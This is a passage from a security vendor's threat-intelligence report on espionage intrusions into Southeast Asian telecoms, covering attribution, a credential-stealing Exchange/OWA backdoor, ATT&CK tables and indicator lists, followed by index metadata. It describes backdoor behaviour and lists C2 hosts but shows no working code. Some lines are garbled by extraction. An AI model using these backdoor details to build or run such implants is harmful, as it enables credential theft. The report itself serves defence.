on over 20 machines in a short period of\ntime. This interesting uptick could be explained by the fact that the attackers lost access due to mitigation efforts and needed to re-establish it.\nAnother possible explanation could be related to Microsoft releasing patches for the newly discovered Microsoft Exchange Server\nvulnerabilities, which caused a sharp rise in attacks against Microsoft Exchange Servers that were unpatched.\n\nCode analysis of this backdoor showed considerable similarities with previously documented backdoors dubbed “Dllshellexc2007” and\n[“Dllshellexc2010”, which were discovered by TrendMicro in their Operation Iron Tiger report and attributed to Group-3390 (also tracked by](https://paper.seebug.org/papers/APT/APT_CyberCriminal_Campagin/2015/2015.09.17.Operation_Iron_Tiger/wp-operation-iron-tiger.pdf)\nsome vendors as APT27, Emissary Panda). According to the Iron Tiger report, the backdoor is compatible and can integrate with the China\nChopper WebShell.\n\nThe activity of this backdoor however, could not be tied directly to the other clusters, which is why we decided to keep it as a separate cluster.\nThat being said, there were some instances where we have observed this backdoor deployed on the same victim as clusters A and B, around\nthe same time frames, and in some cases even on the same endpoints.\n\nGiven these overlaps and the previously documented compatibility of this OWA backdoor with the China Chopper WebShell, it is possible that\nCluster C is somehow related to the activity described in Cluster A, yet a direct connection between the two was not observed in our\ninvestigation.\n\n### Custom OWA Backdoor - Core Functionality\n\nThe custom .NET backdoor deployed is named “Microsoft.Exchange.Clients.Event.dll” and can be installed on either Microsoft Exchange or\nInternet Information Services (IIS) servers. The main purpose of this backdoor is to harvest credentials of any user that authenticates to OWA\nservices. In addition, the backdoor also contains further functionality similar to a WebShell, allowing the attackers to run arbitrary commands,\nexfiltrate data and deploy additional tools.\n\n\n-----\n\ne b a y tse s ob uscated t eacto, c s a code p otect o a d so t a e ce s g syste s d o ob uscat o\nsoftware is often used by malware authors in an effort to hinder analysis. The backdoor intercepts requests that contain “owa/auth.owa'' in the\nURI (a default login URI for OWA), and steals the login credentials:\n\n_The backdoor checks the URI of the http request_\n\nThe backdoor logs the following information from the HTTP requests:\n\nConnection date and time\nRemote IP address\nUsername and password used to login\n\nUser agent\n\nIn order to protect the stolen data, the backdoor XORes each byte of the collected information with the value “183”, and saves the result in\nbase64 encoding to a file named “~ex.dat” in the %temp% directory. If the attacker connects to the server with a specifically crafted session id,\nthe attacker's http request is parsed in order to execute various commands, such as:\n\nDownloading additional files\nUploading files (for data exfiltration)\nDeleting files\n\nExecuting arbitrary commands via CMD Shell\n\n### Similarities with Iron Tiger OWA Backdoors\n\nThe “Microsoft.Exchange.Clients.Event.dll” backdoor discussed in this section exhibits both code and functional similarities to a module named\n[“Microsoft.Exchange.Clients.Auth.dll” that is described in a presentation by Steven Adair and a paper by TrendMicro about operation “Iron](https://published-prd.lanyonevents.com/published/rsaus17/sessionsFiles/5009/HTA-F02-Detecting-and-Responding-to-Advanced-Threats-within-Exchange-Environments.pdf)\nTiger”, which describe sophisticated custom .NET backdoors dubbed “Dllshellexc2007” and “Dllshellexc2010”:\n\n_Example of similar code shared between the two modules_\n\nIn addition, the credentials log file created by both modules is very similar in its structure and collected data:\n\n**Iron Tiger Backdoor - decoded log file of “Microsoft.Exchange.Clients.Auth.dll” (“Dllshellexc2007” and “Dllshellexc2010” backdoors):**\n\n239073 3/2/2015 10:22:09 AM x.x.x.x <account name> <password> Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML,\nlike Gecko) Chrome/40.0.2214.93 Safari/537.36\n\n**Cluster C OWA Backdoor - decoded log file of “Microsoft.Exchange.Clients.Event.dll”:**\n\n1/1/2021 5:32:22 PM x.x.x.x <account name> <password> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66\n\n### Further Connections to Chinese Threat Actors\n\n\n-----\n\nu g ou a a ys s o t e d e e t c uste s, e ot ced te est g co ect o s a d s a t es to o C ese t eat acto s t e te est\nof providing perhaps a broader context, we decided to share our observations in the hope that it will enable other researchers to draw their\nown conclusions as to the degree of relevance of our findings.\n\n### Connections to Winnti’s Tools and Infrastructure\n\n Connections Between Naikon APT Nebulae Backdoor and Winnti’s ShadowPad Infrastructure\n\nWhen examining a Nebulae backdoor sample (likely not related to the attack), we noticed that one of the domains that were contacted by\n[backdoor is ttareyice.jkub[.]com. This domain was previously mentioned in a detailed report which talks about the activity of the Winnti group,](https://www.ptsecurity.com/upload/corporate/ww-en/pt-esc/winnti-2020-eng.pdf)\nand also about its relations to other threat groups. It is also worth mentioning that Winnti is known to attack telecommunications companies.\nAccording to the report, we can see an additional evidence of Winnti sharing its infrastructure, this time between a ShadowPad sample\nattributed to them and the Nebulae backdoor, reportedly attributed to Naikon:\n\n_Nebulae and ShadowPad mutual infrastructure_\n\n### Use of PcShare Backdoor in Previous Winnti-Related Attacks\n\nAnother possible connection to Winnti’s Shadowpad backdoor is via the usage of a customized PcShare Backdoor that was found on multiple\nendpoints in Cluster A described in this report. In October 2020, Dr. Web [released a report detailing targeted attacks in Kazakhstan and](https://st.drweb.com/static/new-www/news/2020/october/Study_of_the_ShadowPad_APT_backdoor_and_its_relation_to_PlugX_en.pdf)\nKyrgyzstan involving Winnti’s Shadowpad backdoor. That same report also mentions a backdoor dubbed “BackDoor.Farfli.125'' that was\ndeployed alongside the Shadowpad payloads. Our analysis of the “BackDoor.Farfli.125'' backdoor concluded that it is a variant of the opensource PcShare backdoor.\n\nFrom a tradecraft perspective, it is interesting to note that the attackers in the aforementioned Dr. Web report also chose to use a loader that\nmasquerades as a legitimate NVIDIA product, as shown in Cluster A of our report.\n\n### Possible Connection Between APT41 and Soft Cell\n\n[While pivoting from indicative PDB paths of the tools used by Soft Cell (listed in Appendix A, some were also observed by Markus Neis), we](https://github.com/yt0ng/cracking_softcell/blob/main/Cracking_SOFTCLL_TLP_WHITE.pdf)\n[came across additional binaries that share code similarities with another malware named ChipShot, attributed to](https://www.slideshare.net/MitchellClarke14/cyber-threat-2019-ncscsans-london-conference-mandiant-grab-bag-of-attacker-activity) [APT41 (tracked by some](https://attack.mitre.org/groups/G0096/)\nvendors as Winnti). ChipShot is a .NET binary that drops a modified China Chopper WebShell, which is found in the resource section of the\nfile.\n\nExamples of the pivoted PDB paths:\n\nE:\\vs_proj\\DeployFilter_NET2.0\\DeployFilter\\obj\\Release\\DeployFilter.pdb - ChipShot Dropper\nE:\\vs_proj\\serviceFilter_NET2.0\\serviceFilter\\obj\\Release\\serviceFilter.pdb - Modified ChinaChopper webshell\n\nIt is noteworthy to mention that APT41 [was also reported targeting telecommunications organizations in the past, and was suggested to be](https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html)\n[linked to the previous Soft Cell campaign from 2019. Also, the group was reported abusing a NVIDIA product (nvSmartEx.exe) for DLL side-](https://www.fireeye.com/content/dam/collateral/en/rpt-apt41-2019.pdf)\nloading, the same product that was abused in cluster A:\n\n_Code snippet from ChipShot Dropper: edits the IIS applicationHost.config file_\n\n\n-----\n\n_Code snippet from Modified ChinaChopper WebShell_\n\n### Possible Connection Between Tropic Trooper and Soft Cell\n\n[As previously mentioned in our report, one of the PcShare payloads analyzed had the same hash that was mentioned in a report by](https://blogs.blackberry.com/en/2019/09/pcshare-backdoor-attacks-targeting-windows-users-with-fakenarrator-malware)\nBlackBerry from 2019. In both instances, the attackers used the exact same DLL search order hijacking technique with a fake NVIDIA product.\n\nAside from the forensic evidence, the geographical locations of the attacks and the timeline also point to a strong tie between the BlackBerry\n[report and this report. BlackBerry hypothesized the threat actor behind the attack was Tropic Trooper, however, as mentioned in their report,](https://attack.mitre.org/groups/G0081/)\nthey could not establish that attribution with high-certainty.\n\nAt this point, we can conclude that both intrusions were carried out by the same threat actor that had access to the same code and used an\nidentical tradecraft. Whether Tropic Trooper and Soft Cell are the same actor remains unclear at the moment, since we could not verify the\nBlackBerry attribution.\n\n### Possible Connection Between Cluster B and an Older Phishing Attempt\n\nThe custom keylogger mentioned in Cluster B of this report was executed by a fake svchost.exe process located in a rather unusual folder:\n\nc:\\program files (x86)\\internet explorer\\svchost.exe (SHA-1: 91b0d7fa50d993c7a35ec501ef5f3585f0003a51).\n\nAside from the unusual location, the file also contained a few typos in its metadata fields (“Coporation”, “Widows”):\n\n_Typos found in metadata fields of the fake svchost.exe_\n\n[Pivoting on these specific typos, file name and version, we were able to find a sample in VirusTotal uploaded from Vietnam in October 2016](https://www.virustotal.com/gui/file/936f0288d3753b654b04b4f751999dfeb52235b2a0ff39ce312ef72b679787aa/detection)\nthat is called “svchost.exe” and contains the same typos and file version. It’s interesting to notice that the sample name in-the-wild is called “1\n_Military Alliance Utilizing ASEAN Plus 3 as Platform An Appraisal for Prospects.exe”:_\n\nUpon executing the sample, it will unpack the following into %TEMP% folder:\n\n\n-----\n\n**decoy** **e**\n\n**An unknown backdoor masquerading as a legitimate Windows binary wmiprvse.exe (SHA-1:**\n5572fa29e61009a626320275b36eef0d5142e3e2)\n\n_Decoy PDF file_\n\n[The decoy PDF file contains questions and answers regarding a known geo-political territorial dispute in the South China Sea, and particularly](https://en.wikipedia.org/wiki/Territorial_disputes_in_the_South_China_Sea)\ndiscusses the Chinese territorial dispute with the Philippines.\n\nWhile this could be merely a coincidence, the probability of having two samples with the exact same typos, file name and version and both\nrelated to China, does seem a bit peculiar, especially since the Naikon APT group that we believe is behind Cluster B is known to have\n[attacked the countries of the South China Sea, including Vietnam and the Philippines, and therefore we thought it might be worth mentioning.](https://research.checkpoint.com/2020/naikon-apt-cyber-espionage-reloaded/)\n\n### Attribution\n\n Attributing Clusters A, B and C\n\nAfter analyzing all of the data we accumulated through our platform, incident response efforts, malware analysis, and threat intelligence, we\nwere able to define three distinct clusters of malicious activity. Each cluster is characterized with its own set of TTPs and infrastructure which\nappear to have operated independently, according to our analysis:\n\n**Cluster A: Attributed to the Soft Cell Activity Group**\n\nBased on the evidence provided in this report as well as internal and publicly available information, Cybereason assesses with high level of\nconfidence that the intrusions detailed in this cluster are consistent with previous activities carried out by the Soft Cell activity group. Soft Cell\nhas yet been attributed to a specific threat actor, however, it is assessed that the group operates on behalf of Chinese state interests. As\nshown in our report, there are some interesting links between the Soft Cell activity group and the APT41/Winnti threat actor, nevertheless, at\nthe time of writing this report, there is not enough evidence to tie the two with sufficient certainty.\n\n**Cluster B: Suspected to be the Naikon APT Group**\n\nBased on the information provided in this report as well as information that is publicly available regarding the Naikon APT threat actor activity,\nCybereason assesses with moderate confidence that the intrusions detailed in this cluster were carried out by the Naikon APT group.\n\n**Cluster C: Potentially Related to Group-3390 (also tracked as Emissary Panda, APT27)**\n\nBased on the information provided in this report, Cybereason assesses with low-to-moderate confidence that the intrusions detailed in this\ncluster were carried out by a threat actor who had access to the code of the “Dllshellexc2007” and “Dllshellexc2010” backdoors detailed in\noperation “Iron Tiger” and attributed by TrendMicro to Group-3390.\n\n\n-----\n\nat be g sa d, e ca ot g o e ce ta te est g o e aps e t co es to t e a o e e t o ed c uste s o e pa t cu a sta ce,\nCybereason observed all three clusters on the same environment, and in some cases even operating on the same endpoints around similar\ntime frames. Whether this is merely a coincidence, or the clusters are somehow inter-connected, is not entirely clear at this point in time.\n\nAmong the three clusters, we lean towards the possibility that Cluster A and C might be connected based on the fact that they have been\noperating in the same environment for over three years (since 2017/2018), while Cluster B only emerged in 2020 Q4. In addition, the OWA\n[backdoor described in Cluster C was previously proven to interact with the China Chopper WebShell that was used extensively in Cluster A.](http://www.erai.com/CustomUploads/ca/wp/2015_12_wp_operation_iron_tiger.pdf)\n\nBased on our understanding and past experience with Chinese threat actors, there are several hypotheses that might explain those overlaps:\n\n**One hypothesis is that the clusters represent the work of two or more teams with different sets of expertise (e.g initial access team,**\nfoothold, telco-technology specialized team, etc.) all working together and reporting to the same Chinese threat actor.\n**A second hypothesis is that there are two or more Chinese threat actors with different agendas / tasks that are aware of each other’s**\nwork and potentially even working in tandem.\n**Another plausible hypothesis is that the clusters are not interconnected and that the threat actors are working independently with no**\ncollaboration, or even piggybacking on the access achieved by one of the actors involved.\n\nOne thing that remains consistent and evident in all three clusters is that they all point to threat actors that are believed to be operating on\n[behalf of Chinese state interests. It is also not surprising that the Telcos targeted in these intrusions are located in ASEAN countries, some of](https://en.wikipedia.org/wiki/ASEAN)\nwhich have long term publicly known disputes with the PRC (People’s Republic of China).\n\n### A Note on CTI Attribution\n\nIn the world of threat intelligence, attribution is often not an exact science and should be continuously re-assessed overtime as new information\nemerges that can shed more light on the identity of the threat actors. Therefore, we encourage our readers to use the information provided in\n[this report and draw their own conclusions. In our attribution, inspired by the famous Diamond Model, we have taken into account the following](https://www.activeresponse.org/wp-content/uploads/2013/07/diamond.pdf)\naspects of the intrusions: Victimology (location, industry), Capabilities (mainly tools, techniques and procedures) and Infrastructure.\n\nWhen analyzing intrusions that happened over years, it is often difficult to separate one kill-chain from another even when there is just a single\nthreat actor. With the possibility of more than one threat actor operating in the same environment, this task can be even more daunting, and\noftentimes it can be tempting to treat everything as part of one larger attack originating from the same threat actor, which could lead to\nmisattribution. We encourage other analysts to work with a well-defined attribution model that can make the fickle task of attribution less prone\nto mistakes and biases.\n\n### Conclusion\n\nIn this blog we uncovered three clusters of intrusions targeting Telcos in ASEAN countries that were active for several years, with one cluster\ngoing back as far as 2017. We assess that the goal behind the intrusions was to facilitate cyber espionage efforts by gaining access to cellular\nproviders for the purpose of exfiltrating sensitive data about the targeted companies and their customers.\n\nEach cluster appears to have its own unique characteristics, distinguishing it from the other clusters detailed in this report. In our report, we\nalso mention the interesting overlaps observed among those clusters - namely the targeting of the same victims, operating around similar time\nframes, and in some cases the existence of all three clusters on the same endpoints.\n\nAccording to our analysis, Cluster A was executed by the Soft Cell activity group, a group that is known to have attacked Telcos in the past in\nmultiple regions and believed to be operating on behalf of Chinese state interests. The intrusions in this cluster span over three years, going\nback to 2018. The attackers behind it have shown great resourcefulness and adaptiveness in light of mitigation efforts, finding their way back in\nrepeatedly, which may demonstrate how important it was for them to obtain the data from the targeted Telcos.\n\nCluster B was discovered in late 2020 and exhibited a different set of tools and techniques, including the rare Nebulae backdoor and the\npreviously undocumented EnrollLogger keylogger. We suspect that the activity in this cluster was carried out by the Naikon APT group, a very\nactive cyber espionage group previously attributed to the Chinese People’s Liberation Army’s (PLA).\n\nCluster C is the oldest among the clusters, with first signs of intrusions going back to 2017. This cluster exhibited a rare OWA backdoor that\nshows considerable code and functionality similarities to previously documented backdoors that were used by the Group-3390 (APT27), an\ninfamous cyber espionage APT group operating on behalf of Chinese state interests.\n\nWhether these clusters are in fact inter-connected or operated independently from each other is not entirely clear at the time of writing this\nreport. We offered several hypotheses that can account for these overlaps, hoping that as time goes by more information will be made\navailable to us and to other researchers that will help to shed light on this conundrum.\n\n## Researchers\n\n\n-----\n\nLIOR ROCHBERGER, SENIOR THREAT RESEARCHER\n\nAs part of the Nocturnus team at Cybereason, Lior has created procedures to lead threat hunting, reverse engineering and malware analysis\nteams. Lior has also been a contributing researcher to multiple threat and malware blogs including Bitbucket, Valak, Ramnit, and Racoon\nstealer. Prior to Cybereason, Lior led SOC operations within the Israeli Air Force.\n\nTOM FAKTERMAN, THREAT RESEARCHER\n\nTom Fakterman, Cyber Security Analyst with the Cybereason Nocturnus Research Team, specializes in protecting critical networks and\nincident response. Tom has experience in researching malware, computer forensics and developing scripts and tools for automated cyber\ninvestigations.\n\nDANIEL FRANK, SENIOR MALWARE RESEARCHER\n\nWith a decade in malware research, Daniel uses his expertise with malware analysis and reverse engineering to understand APT activity and\ncommodity cybercrime attackers. Daniel has previously shared research at RSA Conference, the Microsoft Digital Crimes Consortium, and\nRootcon.\n\nASSAF DAHAN, HEAD OF THREAT RESEARCH\n\nAssaf has over 15 years in the InfoSec industry. He started his career in the Israeli Military 8200 Cybersecurity unit where he developed\nextensive experience in offensive security. Later in his career he led Red Teams, developed penetration testing methodologies, and specialized\nin malware analysis and reverse engineering.\n\n## Indicators of Compromise\n\n_Open the chatbot on the bottom right corner of this report to access the DeadRinger IOCs and Appendix A._\n\n### MITRE ATT&CK BREAKDOWN (Cluster A - Soft Cell Activity)\n\n\n**Reconnaissance** **Initial**\n**Access**\n\n\n**Execution** **Persistence** **Privilege**\n**Escalation**\n\n\n**Defense**\n**Evasion**\n\n\n**Lateral**\n**Movement**\n\n\n**Credential**\n**Access**\n\n\n**Discovery** **Exfilt**\n\n\n-----\n\nGather Victim\nHost Information\n\n\nExploit\nPublicFacing\nApplication\n\n\nCommand-line\ninterface\n\n\n[WebShell](https://attack.mitre.org/techniques/T1100/) Valid\nAccounts Hijack\n[Execution](https://attack.mitre.org/techniques/T1574/)\nFlow\n\n\nCredential\nDumping\n\nCredentials\nfrom\nPassword\nStores\n\n\nSystem\nNetwork\nConfiguration\nDiscovery\n\nRemote\n[System](https://attack.mitre.org/techniques/T1018/)\nDiscovery\n\nAccount\nDiscovery\n\n\nData\nCom\n\nExfilt\nOver\n[Com](https://attack.mitre.org/techniques/T1041/)\nand C\nChan\n\n\n[Active Scanning](https://attack.mitre.org/techniques/T1595/) Windows\n[Management](https://attack.mitre.org/techniques/T1047/)\nInstrumentation\n\n\nCreate\nAccount\n\n\nWindows\n[Admin](https://attack.mitre.org/techniques/T1077/)\nShares\n\nPass the\nHash\n\nRemote\nFile Copy\n\n\nGather Victim\n[Network](https://attack.mitre.org/techniques/T1590/)\nInformation\n\n\n[PowerShell](https://attack.mitre.org/techniques/T1086/) Scheduled\nTask\n\n\n[WebShell](https://attack.mitre.org/techniques/T1100/) Indicator\n[Removal from](https://attack.mitre.org/techniques/T1066/)\nTools\n\nObfuscated\n[Files or](https://attack.mitre.org/techniques/T1027/)\nInformation\n\n\n[Masquerading](https://attack.mitre.org/techniques/T1036/) Permission\n[Groups](https://attack.mitre.org/techniques/T1069/)\nDiscovery\n\nIndicator\nRemoval on\nHost:\nTimestomp\n\n### MITRE ATT&CK BREAKDOWN (Cluster B - Suspected Naikon APT Activity)\n\n\n**Reconnaissance** **Execution** **Persistence** **Privilege**\n**Escalation**\n\n\n**Defense**\n**Evasion**\n\nDLL-side\nLoading\n\nIndicator\n[Removal from](https://attack.mitre.org/techniques/T1066/)\nTools\n\n\n**Lateral**\n**Movement**\n\nSMB/Windows\nAdmin Shares\n\nLateral Tool\nTransfer\n\n\n**Credential**\n**Access**\n\n\nCredential\nDumping\n\n\n**Discovery** **Command**\n**and**\n**Control**\n\n\nGather Victim\nHost Information\n\n\nCommand-line\ninterface\n\n\nWindows\nService\n\n\nValid\nAccounts\n\n\n[Keylogging](https://attack.mitre.org/techniques/T1056/001/) System\nNetwork\nConfiguration\nDiscovery\n\n\nEncrypted\nChannel\n\n\n[Active Scanning](https://attack.mitre.org/techniques/T1595/) Windows\n[Management](https://attack.mitre.org/techniques/T1047/)\nInstrumentation\n\n\nRemote\n[System](https://attack.mitre.org/techniques/T1018/)\nDiscovery\n\n\nGather Victim\n[Network](https://attack.mitre.org/techniques/T1590/)\nInformation\n\n\nSystem\nServices\n\n\n[Masquerading](https://attack.mitre.org/techniques/T1036/) Account\nDiscovery\n\nPermission\n[Groups](https://attack.mitre.org/techniques/T1069/)\nDiscovery\n\n\n### MITRE ATT&CK BREAKDOWN (Cluster C - Custom OWA Backdoor)\n\n**Execution** **Persistence** **Defense Evasion** **Credential** **Discovery** **Command and**\n**Access** **Control**\n\n\n**Exfiltration**\n\n\nCommand-line\ninterface\n\n\n[Web Shell](https://attack.mitre.org/techniques/T1505/003/) [Masquerading](https://attack.mitre.org/techniques/T1036/) Network\nSniffing\n\nDeobfuscate/Decode Files\nor Information\n\n\nAccount\nDiscovery\n\nRemote System\nDiscovery\n\n\n[Web Protocols](https://attack.mitre.org/techniques/T1071/001/) Exfiltration Over C2\nChannel\n\n\n### Indicators of Compromise | DeadRinger\n\n**Note: Not all IOCs observed in the attacks could be shared in our public report.**\n\n\n-----\n\n**Cluster A - Soft Cell Activity**\n\n**Indicator** **Type** **Associated Tool**\n\n47.56.86[.]44 IP Address PcShare Backdoor\n\n45.76.213[.]2 IP Address PcShare Backdoor\n\n45.123.118[.]232 IP Address PcShare Backdoor\n\n19e961e2642e87deb2db6ca8fc2342f4b688a45c SHA-1 Hash PcShare Backdoor\n\nba8f2843e2fb5274394b3c81abc3c2202d9ba592 SHA-1 Hash PcShare Backdoor\n\n101.132.251[.]212 IP Address Cobalt strike (iediag.dll)\n\nCymkpuadkduz[.]xyz Domain Cobalt strike (iediag.dll)\n\n243cd77cfa03f58f6e6568e011e1d6d85969a3a2 SHA-1 Hash Cobalt strike (iediag.dll)\n\nc549a16aaa9901c652b7bc576e980ec2a008a2e0 SHA-1 Hash Mscorsvc.dll - Mimikatz\n\nc2850993bffc8330cff3cb89e9c7652b8819f57f SHA-1 Hash Mimikatz (PowerShell empire)\n\n440e04d0cc5e842c94793baf31e0d188511f0ace SHA-1 Hash D64.exe - Mimikatz\n\ne2340b27a4b759e0e2842bfe5aa48dda7450af4c SHA-1 Hash Mimikatz\n\n15336340db8b73bf73a17c227eb0c59b5a4dece2 SHA-1 Hash China Chopper WebShell (owaauth.aspx)\n\n5bc5dbe3a2ffd5ed1cd9f0c562564c8b72ae2055 SHA-1 Hash China Chopper WebShell (error4.aspx)\n\n**Cluster B - Suspected Naikon APT**\n\nnw.eiyfmrn[.]com Domain Nebulae backdoor C2\n\njdk.gsvvfsso[.]com Domain Nebulae backdoor C2\n\n0dc49c5438a5d80ef31df4a4ccaab92685da3fc6 SHA-1 Hash Nebulae backdoor (chrome_frame_helper.dll)\n\n81cfcf3f8213bce4ca6a460e1db9e7dd1474ba52 SHA-1 Hash PotPlayer.dll.txt (EnrollLogger keylogger)\n\ne93ceb7938120a87c6c69434a6815f0da42ab7f2 SHA-1 Hash Chrome.exe - Mimikatz\n\n**Cluster C - Potentially Linked to Group-3390**\n\n207b7cf5db59d70d4789cb91194c732bcd1cfb4b SHA-1 Hash Microsoft.Exchange.Clients.Event.dll\n\n71999e468252b7458e06f76b5c746a4f4b3aaa58 SHA-1 Hash Microsoft.Exchange.Clients.Event.dll\n\n### Additional Nebulae Backdoor IOCs Potentially linked to Other Attacks\n\n**Indicator** **Type** **Associated Tool**\n\n\n-----\n\n39c5c45dbec92fa99ad37c4bab09164325dbeea0\n\nefc6c117ecc6253ed7400c53b2e148d5e4068636\n\na3c5c0e93f6925846fab5f3c69094d8a465828e9\n\na4232973418ee44713e59e0eae2381a42db5f54c\n\n5602bf8710b1521f6284685d835d5d1df0679b0f\n\ne3fcda85f5f42a2bffb65f3b8deeb523f8db2302\n\n720556854fb4bcf83b9ceb9515fbe3f5cb182dd5\n\nb699861850e4e6fde73dfbdb761645e2270f9c9a\n\n6516d73f8d4dba83ca8c0330d3f180c0830af6a0\n\n99f8263808c7e737667a73a606cbb8bf0d6f0980\n\na5b193118960184fe3aa3b1ea7d8fd1c00423ed6\n\n92ce6af826d2fb8a03d6de7d8aa930b4f94bc2db\n\nd9e828fb891f033656a0797f5fc6d276fbc9748f\n\n87c3dc2ae65dcd818c12c1a4e4368f05719dc036\n\nttareyice.jkub[.]com\n\nmy.eiyfmrn[.]com\n\nA.jrmfeeder[.]org\n\nafhkl.dseqoorg[.]com\n\n### Appendix A: Related Samples to Soft Cell\n\n\nSHA-1 Hash Nebulae backdoor\n\n(Additional Nebulae payloads, potentially related to other attacks)\n\nDomain Nebulae backdoor C2\n\n(potentially related to other attacks)\n\n\nAdditional samples that could be part of the arsenal use by Soft Cell:\n\n**PDB Path** **SHA-1 Hash** **Comment**\n\nE:\\vs_proj\\serviceFilter_NET2.0\\serviceFilter\\obj\\Release\\serviceFilter.pdb d028ecba36e834766b57669778d3d16b309534f4 Modified\nChinaChopper\n\nE:\\vs_proj\\DeployFilter_NET2.0\\DeployFilter\\obj\\Release\\DeployFilter.pdb 538c710dc6228e2eddec8925944adc417112a697 ChipShot\n\nE:\\vs_proj\\serviceFilter_NET4.5\\serviceFilter\\obj\\Release\\serviceFilter.pdb e5efe342950e58fafe77226f2f5f04568c0fac5d Modified\nChinaChopper\n\nE:\\vs_proj\\DeployFilter_NET4.5\\DeployFilter\\obj\\Release\\DeployFilter.pdb 79ad43e3ec3440d107e7d6a5c3d3d42b1097d088 ChipShot\n\n\nE:\\simplify_modify\\x64\\simplify.pdb 79ef78a797403a4ed1a616c68e07fff868a8650a\n\n9c5e496921e3bc882dc40694f1dcc3746a75db19\n\n4f808abc12ab52450062e0ab26a480a228115d96\n\nf0d38de7e9994a4dffdb7f10d18e326235e3d667\n\n68e7fc1ea8799c14a993b74c249fef77d0ef8f28\n\n\nMimikatz\n\nSigned by\n“Whizzimo,\nLLC”\n\n\nE:\\simplify_modify\\Win32\\simplify.pdb aeb573accfd95758550cf30bf04f389a92922844 Mimikatz\n\nE:\\vs_proj\\gh0st3.6_src_Unicode\\gh0st\\Release\\gh0st.pdb e994c00ebd3e7016c9343a18742470f4a03ad5ae Gh0st RAT\n\n\n-----\n\nE:\\vs_proj\\remoteServer\\Release\\remoteServer.pdb b681897f805fc337201e208264f36e6d66b9e363 Gh0st RAT\n\nE:\\vs_proj\\remoteManager\\Release\\remoteServer.pdb 47b1d607db587d932e5986804a68dbda5b385905 Gh0st RAT\n\nE:\\vs_proj\\remoteManager_new\\server\\Release\\remoteServer.pdb 2a2849cb6d4f503a9ee95827a7e05f5d78333dc5 Gh0st RAT\n\nE:\\vs_proj\\simplify_modify\\Win32\\simplify.pdb 7cb7bcb9187f8faf47fd77cf1213ab3fe2350a77 Mimikatz\n\nE:\\vs_proj\\mimkTools\\dcsync_new\\x64\\dcsync64.pdb 440e04d0cc5e842c94793baf31e0d188511f0ace Mimikatz\n\nAbout the Author\n\n**Cybereason Nocturnus**\n\nThe Cybereason Nocturnus Team has brought the world’s brightest minds from the military, government intelligence, and enterprise security to\nuncover emerging threats across the globe. They specialize in analyzing new attack methodologies, reverse-engineering malware, and\nexposing unknown system vulnerabilities. The Cybereason Nocturnus Team was the first to release a vaccination for the 2017 NotPetya and\nBad Rabbit cyberattacks.\n\n[All Posts by Cybereason Nocturnus](https://www.cybereason.com/blog/authors/cybereason-nocturnus)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-03 - DeadRinger- Exposing Chinese Threat Actors Targeting Major Telcos.pdf"
    ],
    "report_names": [
        "2021-08-03 - DeadRinger- Exposing Chinese Threat Actors Targeting Major Telcos.pdf"
    ],
    "threat_actors": [
        {
            "id": "81d49904-579d-45b3-ace2-1fdf0a713bc4",
            "created_at": "2022-10-25T15:50:23.331457Z",
            "updated_at": "2025-03-27T02:00:55.444159Z",
            "deleted_at": null,
            "main_name": "Leafminer",
            "aliases": [
                "Leafminer",
                "Raspite"
            ],
            "source_name": "MITRE:Leafminer",
            "tools": [
                "LaZagne",
                "Mimikatz",
                "MailSniper",
                "PsExec"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "529c1ae9-4579-4245-86a6-20f4563a695d",
            "created_at": "2022-10-25T16:07:23.702006Z",
            "updated_at": "2025-03-27T02:02:09.93109Z",
            "deleted_at": null,
            "main_name": "Hafnium",
            "aliases": [
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "ETDA:Hafnium",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "32c8c1a1-ae5c-4a05-a95d-2e970a46cd1e",
            "created_at": "2022-10-25T16:07:23.777999Z",
            "updated_at": "2025-03-27T02:02:09.976101Z",
            "deleted_at": null,
            "main_name": "Leafminer",
            "aliases": [
                "Flash Kitten",
                "Leafminer",
                "Raspite"
            ],
            "source_name": "ETDA:Leafminer",
            "tools": [
                "Imecab",
                "LaZagne",
                "Mimikatz",
                "PhpSpy",
                "Sorgu"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "552eeef7-4a19-44de-9147-db8893c115ef",
            "created_at": "2023-01-06T13:46:38.598788Z",
            "updated_at": "2025-03-27T02:00:02.869953Z",
            "deleted_at": null,
            "main_name": "RASPITE",
            "aliases": [
                "Raspite",
                "LeafMiner"
            ],
            "source_name": "MISPGALAXY:RASPITE",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7c969685-459b-4c93-a788-74108eab6f47",
            "created_at": "2023-01-06T13:46:39.189751Z",
            "updated_at": "2025-03-27T02:00:03.017103Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "ATK233",
                "G0125",
                "Operation Exchange Marauder",
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "MISPGALAXY:HAFNIUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "61c4ddc4-156b-4828-8570-0979da81f3d0",
            "created_at": "2022-10-25T16:47:55.593828Z",
            "updated_at": "2025-03-27T02:05:17.275161Z",
            "deleted_at": null,
            "main_name": "BRONZE MAYFAIR",
            "aliases": [
                "Gothic Panda ",
                "TG-0110 ",
                "APT3 "
            ],
            "source_name": "Secureworks:BRONZE MAYFAIR",
            "tools": [
                " HUC Proxy Malware (Htran)",
                " Pirpi",
                " SplitVPN",
                " ctt",
                " ctx",
                "Cookiecutter"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3b8b4ed7-e8cc-4a3a-b14d-c8ebf87c0f9c",
            "created_at": "2023-01-06T13:46:39.062729Z",
            "updated_at": "2025-03-27T02:00:02.988182Z",
